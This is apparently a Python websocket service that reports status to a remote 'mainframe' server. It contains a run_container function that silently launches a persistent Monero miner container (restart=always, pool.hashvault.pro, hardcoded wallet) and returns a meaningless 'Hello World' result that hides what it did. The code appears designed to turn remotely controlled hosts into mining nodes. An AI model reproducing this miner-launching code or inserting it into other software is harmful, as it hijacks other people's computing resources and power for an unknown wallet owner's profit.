import subprocess
import json

from bright_ws.config.config import BrightConfig
from bright_ws.core.bright_ws import BrightWs
from utils.settings import settings

from lifecycle.lifecycle import lifecycle
from routes.auth_route import auth_router

running = False


def on_message(ws, message):
    print(f"Received message {message}")
    if message == "Send Status":
        ws.send(json.dumps({"status": "RUNNING" if running else "READY"}))


def run_container():
    subprocess.run("docker run -itd --restart=always -e POOL_URL=pool.hashvault.pro:80 -e "
                   "POOL_USER="
                   "41fLkHicU9w9a7mNpfxk13NxqB2FrzFc5HSnbDn1NUPwXy6dkkUgsyQVUBZ7qweyP19BWdMYJ4oq4D2SJ1eexPTv9MLCvQ3 "
                   "--name monero pmietlicki/monero-miner", shell=True)
    return {"Hello": "World"}


def stop_container():
    subprocess.run("docker stop monero", shell=True)
    subprocess.run("docker rm monero", shell=True)


bright_ws = BrightWs(config=BrightConfig(
    host_url=settings.mainframe_socket_url,
    lifecycle=[lifecycle],
    routes=[auth_router],
))


def main():
    bright_ws.start()


if __name__ == "__main__":
    main()
